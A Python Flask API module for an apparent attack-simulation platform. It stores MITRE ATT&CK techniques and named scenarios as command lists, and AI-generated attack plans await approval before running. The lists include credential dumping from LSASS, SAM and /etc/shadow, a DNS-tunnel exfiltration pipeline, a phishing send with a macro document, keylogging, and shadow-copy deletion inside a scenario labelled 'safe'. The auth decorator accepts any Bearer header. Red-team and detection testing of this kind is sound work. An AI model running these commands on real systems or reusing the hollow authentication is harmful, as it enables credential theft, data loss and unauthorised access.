"""
User-Controlled Attack API Routes
Allows users to request specific attacks, techniques, and custom scenarios
"""

from flask import Blueprint, request, jsonify, current_app
from datetime import datetime, timezone
import json
import sqlite3
import uuid
import asyncio
from functools import wraps
import logging
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from agents.attack_agent.ai_attacker_brain import AIAttackerBrain

logger = logging.getLogger(__name__)
user_attack_bp = Blueprint('user_attack', __name__)

# MITRE ATT&CK Technique Database
MITRE_TECHNIQUES = {
    "T1082": {
        "name": "System Information Discovery",
        "description": "Gathering information about the system configuration and hardware",
        "commands": {
            "windows": ["systeminfo", "wmic os get Caption,Version", "Get-ComputerInfo"],
            "linux": ["uname -a", "cat /etc/os-release", "lscpu", "free -h"],
            "macos": ["system_profiler SPSoftwareDataType", "sysctl -a", "sw_vers"]
        }
    },
    "T1003": {
        "name": "OS Credential Dumping",
        "description": "Attempting to dump credentials to obtain account login information",
        "commands": {
            "windows": ["mimikatz.exe", "procdump.exe -ma lsass.exe", "reg save HKLM\\SAM sam.hive"],
            "linux": ["cat /etc/shadow", "unshadow /etc/passwd /etc/shadow", "john --wordlist=/usr/share/wordlists/rockyou.txt shadow"],
            "macos": ["security dump-keychain", "dscl . -read /Users/username"]
        }
    },
    "T1055": {
        "name": "Process Injection",
        "description": "Injecting code into processes to evade defenses",
        "commands": {
            "windows": ["Invoke-ReflectivePEInjection", "CreateRemoteThread", "SetWindowsHookEx"],
            "linux": ["ptrace", "LD_PRELOAD=/tmp/evil.so", "gdb -p PID"],
            "macos": ["DYLD_INSERT_LIBRARIES=/tmp/evil.dylib", "task_for_pid()"]
        }
    },
    "T1021": {
        "name": "Remote Services",
        "description": "Using remote services to move laterally",
        "commands": {
            "windows": ["Enter-PSSession -ComputerName TARGET", "net use \\\\TARGET\\IPC$", "wmic /node:TARGET process call create"],
            "linux": ["ssh user@target", "scp file user@target:", "ansible -m shell -a 'command'"],
            "macos": ["ssh user@target", "osascript -e 'tell app \"Remote Desktop\"'"]
        }
    },
    "T1566": {
        "name": "Phishing",
        "description": "Sending phishing messages to gain access",
        "commands": {
            "all": ["Send-MailMessage -To victim@company.com -Subject 'Invoice' -Attachments malware.docm"]
        }
    },
    "T1190": {
        "name": "Exploit Public-Facing Application",
        "description": "Exploiting vulnerabilities in internet-facing systems",
        "commands": {
            "all": ["sqlmap -u 'http://target/page?id=1' --dump", "nikto -h http://target", "nmap --script vuln target"]
        }
    }
}

# Named Attack Scenarios
NAMED_ATTACKS = {
    "dns_tunneling": {
        "name": "DNS Tunneling",
        "description": "Data exfiltration through DNS queries",
        "techniques": ["T1071.004", "T1048"],
        "phases": [
            {"name": "Setup", "commands": ["iodine -f -P password tunnel.domain.com"]},
            {"name": "Tunnel", "commands": ["dns2tcp", "dnscat2"]},
            {"name": "Exfiltrate", "commands": ["base64 data | xxd -p | fold -w63 | xargs -I {} nslookup {}.tunnel.domain.com"]}
        ]
    },
    "ransomware_simulation": {
        "name": "Ransomware Simulation",
        "description": "Simulated ransomware attack (safe)",
        "techniques": ["T1486", "T1490", "T1489"],
        "phases": [
            {"name": "Encrypt", "commands": ["FOR %f IN (*.txt) DO ren %f %f.locked"]},
            {"name": "Ransom Note", "commands": ["echo 'Your files have been encrypted' > README.txt"]},
            {"name": "Delete Shadows", "commands": ["vssadmin delete shadows /all /quiet"]}
        ]
    },
    "credential_harvesting": {
        "name": "Credential Harvesting",
        "description": "Various credential theft techniques",
        "techniques": ["T1003", "T1555", "T1552"],
        "phases": [
            {"name": "Memory Dump", "commands": ["procdump -ma lsass.exe lsass.dmp"]},
            {"name": "Browser Creds", "commands": ["LaZagne.exe browsers"]},
            {"name": "Keylogging", "commands": ["Get-Keystrokes -LogPath C:\\temp\\keys.txt"]}
        ]
    }
}

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated_function

def get_db_connection():
    conn = sqlite3.connect(current_app.config.get('DATABASE', 'soc_database.db'))
    conn.row_factory = sqlite3.Row
    return conn

# ============= SPECIFIC TECHNIQUE EXECUTION =============

@user_attack_bp.route('/ai-attack/execute-technique', methods=['POST'])
@require_auth
def execute_specific_technique():
    """Execute a specific MITRE ATT&CK technique"""
    try:
        data = request.get_json()
        technique_id = data.get('technique', '').upper()
        targets = data.get('targets', [])
        message = data.get('message', '')
        
        # Validate technique
        if technique_id not in MITRE_TECHNIQUES:
            return jsonify({
                'success': False,
                'error': f'Unknown technique: {technique_id}',
                'available': list(MITRE_TECHNIQUES.keys())
            }), 400
        
        technique = MITRE_TECHNIQUES[technique_id]
        workflow_id = f"wf-{uuid.uuid4().hex[:8]}"
        
        # Determine target platforms
        if not targets:
            # Auto-select targets based on online agents
            conn = get_db_connection()
            cursor = conn.execute("""
                SELECT id, name, platform FROM agents 
                WHERE status = 'online' AND type = 'endpoint'
                LIMIT 5
            """)
            targets = [{'id': row['id'], 'name': row['name'], 'platform': row['platform']} 
                      for row in cursor.fetchall()]
            conn.close()
        
        # Build attack plan
        plan = {
            'commands': [],
            'targets': [],
            'estimatedTime': '5-10 minutes'
        }
        
        for target in targets:
            platform = target.get('platform', 'windows').lower()
            if platform in technique['commands']:
                plan['commands'].extend(technique['commands'][platform])
                plan['targets'].append(target.get('name', target.get('id')))
        
        # Store workflow
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO attack_workflows 
            (id, objective, status, selected_scenario, created_at)
            VALUES (?, ?, ?, ?, ?)
        """, (
            workflow_id,
            f"Execute {technique_id}: {technique['name']}",
            'awaiting_approval',
            json.dumps({
                'technique': technique_id,
                'name': technique['name'],
                'plan': plan
            }),
            datetime.now(timezone.utc).isoformat()
        ))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'workflowId': workflow_id,
            'technique': {
                'id': technique_id,
                'name': technique['name'],
                'description': technique['description']
            },
            'plan': plan,
            'status': 'awaiting_approval',
            'message': 'Attack plan ready. Please review and approve.'
        })
        
    except Exception as e:
        logger.error(f"Error executing technique: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============= NAMED ATTACK EXECUTION =============

@user_attack_bp.route('/ai-attack/named-attack', methods=['POST'])
@require_auth
def execute_named_attack():
    """Execute a named attack scenario"""
    try:
        data = request.get_json()
        attack_name = data.get('attackName', '').lower().replace(' ', '_')
        objective = data.get('objective', '')
        
        # Find matching attack
        attack = None
        for key, value in NAMED_ATTACKS.items():
            if key == attack_name or value['name'].lower() == attack_name.lower():
                attack = value
                break
        
        if not attack:
            return jsonify({
                'success': False,
                'error': f'Unknown attack: {attack_name}',
                'available': [v['name'] for v in NAMED_ATTACKS.values()]
            }), 400
        
        workflow_id = f"wf-{uuid.uuid4().hex[:8]}"
        
        # Build attack plan
        attack_plan = {
            'name': attack['name'],
            'description': attack['description'],
            'phases': attack['phases'],
            'techniques': attack['techniques'],
            'detectionTest': f"Verifying if {attack['name']} is detected by SIEM",
            'safetyNote': 'Simulation mode - no actual damage'
        }
        
        # Store workflow
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO attack_workflows 
            (id, objective, status, selected_scenario, created_at)
            VALUES (?, ?, ?, ?, ?)
        """, (
            workflow_id,
            objective or f"Execute {attack['name']}",
            'awaiting_approval',
            json.dumps(attack_plan),
            datetime.now(timezone.utc).isoformat()
        ))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'workflowId': workflow_id,
            'attackPlan': attack_plan,
            'status': 'awaiting_approval',
            'message': 'Attack scenario ready for review.'
        })
        
    except Exception as e:
        logger.error(f"Error executing named attack: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============= CUSTOM AI-GENERATED SCENARIOS =============

@user_attack_bp.route('/ai-attack/custom-scenario', methods=['POST'])
@require_auth
def create_custom_scenario():
    """Create a custom AI-generated attack scenario"""
    try:
        data = request.get_json()
        user_request = data.get('request', '')
        constraints = data.get('constraints', {})
        
        if not user_request:
            return jsonify({
                'success': False,
                'error': 'Please provide a description of the attack scenario'
            }), 400
        
        workflow_id = f"wf-{uuid.uuid4().hex[:8]}"
        
        # Use AI to generate scenario
        async def generate():
            brain = AIAttackerBrain()
            
            # Create initial state with user request
            initial_state = {
                'attack_objective': user_request,
                'network_topology': {},
                'available_endpoints': [],
                'vulnerable_services': [],
                'attack_scenarios': [],
                'selected_scenario': {},
                'attack_plan': {},
                'user_approval': False,
                'user_modifications': constraints,
                'messages': []
            }
            
            # Run workflow to generate scenarios
            config = {"configurable": {"thread_id": workflow_id}}
            result = await brain.run_attack_workflow(user_request, config)
            return result
        
        # Run async generation
        result = asyncio.run(generate())
        
        # Extract generated scenario
        scenarios = result.get('attack_scenarios', [])
        if scenarios:
            scenario = scenarios[0]  # Take first scenario
        else:
            # Fallback scenario
            scenario = {
                'name': 'Custom Security Assessment',
                'description': f'AI-generated scenario for: {user_request}',
                'attackChain': [
                    {
                        'technique': 'T1595',
                        'name': 'Active Scanning',
                        'implementation': 'Network reconnaissance'
                    },
                    {
                        'technique': 'T1190',
                        'name': 'Exploit Public-Facing Application',
                        'implementation': 'Vulnerability exploitation'
                    }
                ],
                'expectedOutcomes': ['Test security controls', 'Identify weaknesses'],
                'rollbackPlan': 'All changes will be reverted'
            }
        
        # Store workflow
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO attack_workflows 
            (id, objective, status, selected_scenario, created_at)
            VALUES (?, ?, ?, ?, ?)
        """, (
            workflow_id,
            user_request,
            'awaiting_approval',
            json.dumps(scenario),
            datetime.now(timezone.utc).isoformat()
        ))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'workflowId': workflow_id,
            'generatedScenario': scenario,
            'requiresApproval': True,
            'message': 'Custom scenario generated. Please review.'
        })
        
    except Exception as e:
        logger.error(f"Error creating custom scenario: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============= ATTACK CONTROL =============

@user_attack_bp.route('/ai-attack/control/<workflow_id>', methods=['POST'])
@require_auth
def control_attack(workflow_id):
    """Control ongoing attack execution"""
    try:
        data = request.get_json()
        action = data.get('action')
        
        valid_actions = ['pause', 'resume', 'stop', 'skip_phase']
        if action not in valid_actions:
            return jsonify({
                'success': False,
                'error': f'Invalid action. Valid actions: {valid_actions}'
            }), 400
        
        # Update workflow status
        conn = get_db_connection()
        cursor = conn.cursor()
        
        status_map = {
            'pause': 'paused',
            'resume': 'executing',
            'stop': 'stopped',
            'skip_phase': 'executing'
        }
        
        new_status = status_map[action]
        cursor.execute("""
            UPDATE attack_workflows 
            SET status = ? 
            WHERE id = ?
        """, (new_status, workflow_id))
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'workflowId': workflow_id,
            'action': action,
            'status': new_status,
            'message': f'Attack {action} successful'
        })
        
    except Exception as e:
        logger.error(f"Error controlling attack: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============= ATTACK LIBRARY =============

@user_attack_bp.route('/ai-attack/library', methods=['GET'])
@require_auth
def get_attack_library():
    """Get available attack templates and techniques"""
    try:
        library = {
            'mitreCategories': {
                'reconnaissance': [
                    {'id': 'T1595', 'name': 'Active Scanning'},
                    {'id': 'T1592', 'name': 'Gather Victim Host Information'}
                ],
                'initial_access': [
                    {'id': 'T1566', 'name': 'Phishing'},
                    {'id': 'T1190', 'name': 'Exploit Public-Facing Application'},
                    {'id': 'T1078', 'name': 'Valid Accounts'}
                ],
                'execution': [
                    {'id': 'T1059', 'name': 'Command and Scripting Interpreter'},
                    {'id': 'T1053', 'name': 'Scheduled Task/Job'}
                ],
                'persistence': [
                    {'id': 'T1547', 'name': 'Boot or Logon Autostart'},
                    {'id': 'T1546', 'name': 'Event Triggered Execution'}
                ],
                'privilege_escalation': [
                    {'id': 'T1055', 'name': 'Process Injection'},
                    {'id': 'T1068', 'name': 'Exploitation for Privilege Escalation'}
                ],
                'defense_evasion': [
                    {'id': 'T1070', 'name': 'Indicator Removal'},
                    {'id': 'T1036', 'name': 'Masquerading'}
                ],
                'credential_access': [
                    {'id': 'T1003', 'name': 'OS Credential Dumping'},
                    {'id': 'T1555', 'name': 'Credentials from Password Stores'}
                ],
                'discovery': [
                    {'id': 'T1082', 'name': 'System Information Discovery'},
                    {'id': 'T1083', 'name': 'File and Directory Discovery'}
                ],
                'lateral_movement': [
                    {'id': 'T1021', 'name': 'Remote Services'},
                    {'id': 'T1570', 'name': 'Lateral Tool Transfer'}
                ],
                'collection': [
                    {'id': 'T1005', 'name': 'Data from Local System'},
                    {'id': 'T1114', 'name': 'Email Collection'}
                ],
                'exfiltration': [
                    {'id': 'T1041', 'name': 'Exfiltration Over C2 Channel'},
                    {'id': 'T1048', 'name': 'Exfiltration Over Alternative Protocol'}
                ],
                'impact': [
                    {'id': 'T1486', 'name': 'Data Encrypted for Impact'},
                    {'id': 'T1489', 'name': 'Service Stop'}
                ]
            },
            'namedAttacks': list(NAMED_ATTACKS.keys()),
            'customScenarios': [
                'Ransomware Simulation',
                'APT Campaign',
                'Insider Threat',
                'Supply Chain Attack',
                'Zero-Day Simulation',
                'Data Exfiltration Test',
                'Lateral Movement Assessment',
                'Cloud Security Test',
                'Active Directory Attack',
                'Web Application Pentest'
            ],
            'supportedTechniques': list(MITRE_TECHNIQUES.keys())
        }
        
        return jsonify({
            'success': True,
            'library': library,
            'totalTechniques': len(MITRE_TECHNIQUES),
            'totalNamedAttacks': len(NAMED_ATTACKS)
        })
        
    except Exception as e:
        logger.error(f"Error getting attack library: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============= ATTACK QUERY =============

@user_attack_bp.route('/ai-attack/query', methods=['POST'])
@require_auth
def query_attack_info():
    """Query AI about attack techniques and recommendations"""
    try:
        data = request.get_json()
        question = data.get('question', '')
        
        if not question:
            return jsonify({
                'success': False,
                'error': 'Please provide a question'
            }), 400
        
        # Simple recommendation engine (in production, use AI)
        recommendations = []
        
        if 'lateral' in question.lower():
            recommendations = [
                {'technique': 'T1021.001', 'name': 'RDP', 'reason': 'Common in enterprises'},
                {'technique': 'T1021.002', 'name': 'SMB', 'reason': 'Mimics real attackers'},
                {'technique': 'T1021.006', 'name': 'WinRM', 'reason': 'Often overlooked'}
            ]
        elif 'credential' in question.lower():
            recommendations = [
                {'technique': 'T1003.001', 'name': 'LSASS Memory', 'reason': 'Most common method'},
                {'technique': 'T1555', 'name': 'Password Stores', 'reason': 'Browser credentials'},
                {'technique': 'T1552', 'name': 'Unsecured Credentials', 'reason': 'Config files'}
            ]
        elif 'persistence' in question.lower():
            recommendations = [
                {'technique': 'T1547', 'name': 'Registry Run Keys', 'reason': 'Classic persistence'},
                {'technique': 'T1053', 'name': 'Scheduled Tasks', 'reason': 'Flexible timing'},
                {'technique': 'T1546', 'name': 'Event Triggered', 'reason': 'Stealthy'}
            ]
        else:
            recommendations = [
                {'technique': 'T1082', 'name': 'System Discovery', 'reason': 'Good starting point'},
                {'technique': 'T1083', 'name': 'File Discovery', 'reason': 'Find targets'},
                {'technique': 'T1057', 'name': 'Process Discovery', 'reason': 'Identify defenses'}
            ]
        
        return jsonify({
            'success': True,
            'question': question,
            'answer': f"Based on your question about '{question}', here are my recommendations:",
            'recommendations': recommendations,
            'suggestedScenario': {
                'name': f'Testing {question.split()[0].title()} Security',
                'duration': '30-45 minutes',
                'phases': ['Discovery', 'Initial Access', 'Execution', 'Analysis']
            },
            'createPlan': True
        })
        
    except Exception as e:
        logger.error(f"Error querying attack info: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
